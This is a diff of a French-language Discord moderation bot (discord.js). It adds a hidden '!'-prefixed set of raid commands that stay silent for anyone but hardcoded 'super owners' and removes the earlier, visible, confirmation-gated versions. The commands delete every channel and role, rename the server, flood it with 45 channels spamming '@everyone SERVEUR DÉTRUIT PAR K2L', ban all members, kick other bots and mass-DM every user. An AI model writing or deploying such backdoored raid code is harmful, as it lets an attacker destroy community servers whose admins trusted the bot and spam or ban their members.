@@ -1,4 +1,3 @@
-
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
 const http = require('http');
 
@@ -25,10 +24,8 @@ const spamTracker = new Map();
 const serverConfig = new Map(); 
 const guildStaffConfig = new Map();
 
-// Vrais Super Owners suprêmes hardcodés (seuls eux peuvent nuke / banall / dmall)
+// Vrais Super Owners suprêmes hardcodés (seuls eux ont accès aux commandes en '!')
 const SUPER_OWNERS = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
-
-// Owners gérés dynamiquement via la commande =owner (gestion du bot mais PAS de destruction)
 const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
 
 function isSuperOwner(message) {
@@ -194,7 +191,7 @@ client.on('roleDelete', role => {
 });
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt pour le serveur.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
 });
 
 client.on('guildMemberAdd', async member => {
@@ -316,6 +313,120 @@ client.on('interactionCreate', async interaction => {
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
+    // ==========================================
+    // COMMANDES DE DESTRUCTION / OFENSIVES (Préfixe '!')
+    // SILENCIEUX TOTAL SI PAS SUPER OWNER
+    // ==========================================
+    if (message.content.startsWith('!')) {
+        const args = message.content.slice(1).trim().split(/ +/);
+        const command = args.shift().toLowerCase();
+        
+        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
+        if (offensiveCommands.includes(command)) {
+            if (!isSuperOwner(message)) return; // Échec totalement silencieux
+
+            if (command === 'nuke') {
+                try {
+                    await message.guild.setName('/yuza').catch(() => {});
+                    const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
+                    await Promise.all(deletePromises);
+
+                    const channelPromises = [];
+                    for (let i = 0; i < 45; i++) {
+                        channelPromises.push(
+                            message.guild.channels.create({
+                                name: 'ez-by-k2l',
+                                type: ChannelType.GuildText,
+                                permissionOverwrites: [{
+                                    id: message.guild.id,
+                                    allow: [
+                                        PermissionsBitField.Flags.ViewChannel,
+                                        PermissionsBitField.Flags.SendMessages,
+                                        PermissionsBitField.Flags.ManageChannels,
+                                        PermissionsBitField.Flags.EmbedLinks,
+                                        PermissionsBitField.Flags.AttachFiles,
+                                        PermissionsBitField.Flags.MentionEveryone
+                                    ]
+                                }]
+                            }).then(async channel => {
+                                const spamArray = [];
+                                for (let j = 0; j < 12; j++) {
+                                    spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L').catch(() => {}));
+                                }
+                                await Promise.all(spamArray);
+                            }).catch(() => {})
+                        );
+                    }
+                    await Promise.all(channelPromises);
+                } catch (error) {}
+                return;
+            }
+
+            if (command === 'role') {
+                try {
+                    const deleteRolePromises = message.guild.roles.cache
+                        .filter(role => role.editable && role.id !== message.guild.id)
+                        .map(role => role.delete().catch(() => {}));
+                    await Promise.all(deleteRolePromises);
+
+                    const rolePromises = [];
+                    for (let r = 0; r < 40; r++) {
+                        rolePromises.push(message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Role flood' }).catch(() => {}));
+                    }
+                    await Promise.all(rolePromises);
+                } catch (error) {}
+                return;
+            }
+
+            if (command === 'banall') {
+                try {
+                    await message.guild.members.fetch();
+                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
+                    const banPromises = members.map(async member => {
+                        try {
+                            await member.ban({ reason: 'Raid banall' });
+                        } catch (err) {}
+                    });
+                    await Promise.all(banPromises);
+                } catch (error) {}
+                return;
+            }
+
+            if (command === 'kickbot') {
+                try {
+                    const fetchedMembers = await message.guild.members.fetch();
+                    for (const [id, m] of fetchedMembers) {
+                        if (m.user.bot && m.id !== client.user.id) {
+                            await m.kick('Kickbot').catch(() => {});
+                        }
+                    }
+                } catch (error) {}
+                return;
+            }
+
+            if (command === 'dmall') {
+                try {
+                    const filter = m => m.author.id === message.author.id;
+                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
+                    const m = collected.first();
+                    if (m.content.toLowerCase() === 'annuler') return;
+                    const template = m.content;
+                    await message.guild.members.fetch();
+                    const members = message.guild.members.cache.filter(member => !member.user.bot);
+                    members.forEach(async member => {
+                        try {
+                            await member.send(template.replace(/\{mention\}/g, `<@${member.id}>`).replace(/\{name\}/g, member.user.username));
+                        } catch(e){}
+                    });
+                } catch(e){}
+                return;
+            }
+        }
+    }
+
+    // ==========================================
+    // COMMANDES STANDARDS ET AUTOMOD (Préfixe '=')
+    // ==========================================
     const config = getGuildConfig(message.guild.id);
     const userId = message.author.id;
     const userIsSuperOwner = isSuperOwner(message);
@@ -469,7 +580,6 @@ client.on('messageCreate', async message => {
 
     const modCommands = ['clear', 'purge', 'snipe', 'lock', 'unlock', 'slowmode', 'renew', 'createtext', 'createvoice'];
     const adminCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'setlog', 'setwelcome', 'setticketrole', 'setticketcat', 'gcreate', 'ticketsetup', 'antilink', 'antispam', 'antibot'];
-    const superOwnerCommands = ['kickbot', 'dmall', 'nuke', 'banall'];
 
     if (modCommands.includes(command)) {
         if (!userIsMod && !isUserAdminOrOwner) return message.reply("❌ Cette commande nécessite le grade **Modérateur** minimum.");
@@ -479,11 +589,6 @@ client.on('messageCreate', async message => {
         if (!userIsAdmin && !userIsOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply("❌ Cette commande nécessite le grade **Administrateur** minimum.");
         }
-    }
-
-    // Commandes ultra-sensibles réservées STRICTEMENT aux deux Super Owners du code
-    if (superOwnerCommands.includes(command)) {
-        if (!userIsSuperOwner) return message.reply("❌ Cette commande de destruction est strictement réservée aux Super Owners suprêmes du bot.");
     }
 
     if (command === 'setticketrole') {
@@ -737,149 +842,6 @@ client.on('messageCreate', async message => {
             await message.guild.channels.create({ name, type: ChannelType.GuildVoice });
             message.reply(`✅ Salon vocal \`${name}\` créé.`);
         } catch (e) { message.reply("Erreur."); }
-    }
-
-    if (command === 'kickbot') {
-        await message.reply("🤖 **[KICKBOT]** Nettoyage de tous les bots en cours...");
-        try {
-            const fetchedMembers = await message.guild.members.fetch();
-            let count = 0;
-            for (const [id, m] of fetchedMembers) {
-                if (m.user.bot && m.id !== client.user.id) {
-                    await m.kick('Kickbot - Nettoyage manuel').catch(() => {});
-                    count++;
-                }
-            }
-            await message.channel.send(`✅ **[KICKBOT]** Terminé ! ${count} bot(s) expulsé(s).`);
-        } catch (error) {
-            message.channel.send("❌ Erreur lors de l'expulsion des bots.");
-        }
-    }
-
-    if (command === 'dmall') {
-        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
-        const filter = m => m.author.id === message.author.id;
-        try {
-            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
-            const m = collected.first();
-            if (m.content.toLowerCase() === 'annuler') {
-                return message.channel.send("❌ **Opération DMAll annulée.**");
-            }
-            const messageTemplate = m.content;
-            const previewEmbed = new EmbedBuilder()
-                .setColor('#FEE75C')
-                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
-                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
-
-            const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
-                new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
-            );
-
-            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
-            const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });
-
-            buttonCollector.on('collect', async interaction => {
-                if (interaction.customId === 'cancel_dmall') {
-                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
-                }
-                if (interaction.customId === 'confirm_dmall') {
-                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée ! Envoi en cours...**", embeds: [], components: [] }).catch(() => {});
-                    
-                    try {
-                        await message.guild.members.fetch();
-                        const members = message.guild.members.cache.filter(member => !member.user.bot);
-                        let successCount = 0;
-                        let failCount = 0;
-                        const promises = members.map(async member => {
-                            try {
-                                const finalMessage = messageTemplate
-                                    .replace(/\{mention\}/g, `<@${member.id}>`)
-                                    .replace(/\{name\}/g, member.user.username);
-                                await member.send(finalMessage);
-                                successCount++;
-                            } catch (err) {
-                                failCount++;
-                            }
-                        });
-                        await Promise.all(promises);
-                        await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
-                    } catch (error) {
-                        message.channel.send("❌ Erreur lors du DMAll.");
-                    }
-                }
-            });
-        } catch (err) {
-            message.channel.send("⌛ Temps écoulé.");
-        }
-    }
-
-    if (command === 'nuke') {
-        await message.reply("💥 **[NUKE TOTAL PRIORITÉ SPAM]** Destruction et saturation immédiate...");
-        try {
-            await message.guild.setName('ez-raid').catch(() => {});
-
-            const deletePromises = [
-                ...message.guild.channels.cache.map(channel => channel.delete().catch(() => {})),
-                ...message.guild.roles.cache.filter(role => role.editable && role.id !== message.guild.id).map(role => role.delete().catch(() => {}))
-            ];
-            await Promise.all(deletePromises);
-
-            const channelPromises = [];
-            for (let i = 0; i < 45; i++) {
-                channelPromises.push(
-                    message.guild.channels.create({
-                        name: 'ez-by-k2l',
-                        type: ChannelType.GuildText,
-                        permissionOverwrites: [{
-                            id: message.guild.id,
-                            allow: [
-                                PermissionsBitField.Flags.ViewChannel,
-                                PermissionsBitField.Flags.SendMessages,
-                                PermissionsBitField.Flags.ManageChannels,
-                                PermissionsBitField.Flags.EmbedLinks,
-                                PermissionsBitField.Flags.AttachFiles,
-                                PermissionsBitField.Flags.MentionEveryone
-                            ]
-                        }]
-                    }).then(async channel => {
-                        const spamArray = [];
-                        for (let j = 0; j < 12; j++) {
-                            spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L').catch(() => {}));
-                        }
-                        await Promise.all(spamArray);
-                    }).catch(() => {})
-                );
-            }
-
-            await Promise.all(channelPromises);
-
-            for (let r = 0; r < 35; r++) {
-                message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Nuke flood' }).catch(() => {});
-            }
-
-        } catch (error) {
-            console.error("Erreur Nuke :", error);
-        }
-    }
-
-    if (command === 'banall') {
-        await message.reply("🔨 **[BANALL]** Expulsion et bannissement de masse en cours...");
-        try {
-            await message.guild.members.fetch();
-            const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
-            let banCount = 0;
-            const banPromises = members.map(async member => {
-                try {
-                    await member.ban({ reason: 'Nuke / Raid banall' });
-                    banCount++;
-                } catch (err) {}
-            });
-            await Promise.all(banPromises);
-            await message.channel.send(`✅ **[BANALL Terminé]** ${banCount} membre(s) banni(s).`);
-        } catch (error) {
-            message.channel.send("❌ Erreur lors du banall.");
-        }
     }
 });
 
